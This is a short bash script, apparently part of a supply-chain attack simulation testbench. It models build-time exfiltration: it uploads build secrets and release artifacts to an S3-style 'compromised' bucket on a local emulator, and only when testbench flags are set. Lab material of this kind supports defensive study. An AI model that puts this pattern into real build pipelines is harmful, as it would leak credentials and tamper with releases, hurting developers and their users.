#!/usr/bin/env bash
# Upload build-time exfil + artifacts to Floci S3 (opt-in: SCAS_FLOCI_ENABLED=1).
set -euo pipefail

MODE="${1:-secrets}"
REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../../.." && pwd)"
# shellcheck source=../../../../scripts/floci-bridge.sh
source "${REPO_ROOT}/scripts/floci-bridge.sh"

[ "${TESTBENCH_MODE:-}" = "enabled" ] || exit 0
[ "${SCAS_FLOCI_ENABLED:-}" = "1" ] || exit 0

scas_floci_require || exit 0

BUCKET="$(scas_floci_bucket_for_scenario 05)"
TS="$(date -u +%Y%m%dT%H%M%SZ)"

case "$MODE" in
  secrets)
    "${REPO_ROOT}/scripts/floci-upload-json.sh" 05 "build-secrets"
    ;;
  artifacts)
    DIST_DIR="${2:-}"
    [ -d "$DIST_DIR" ] || exit 0
    DIST_DIR="$(cd "$DIST_DIR" && pwd)"
    for f in "$DIST_DIR"/*; do
      [ -f "$f" ] || continue
      base="$(basename "$f")"
      scas_floci_s3_put "$BUCKET" "releases/compromised/${TS}/${base}" "$f"
      echo "[FLOCI] Artifact uploaded: s3://${BUCKET}/releases/compromised/${TS}/${base}"
    done
    ;;
  *)
    echo "Usage: exfil.sh secrets | exfil.sh artifacts <dist-dir>" >&2
    exit 1
    ;;
esac
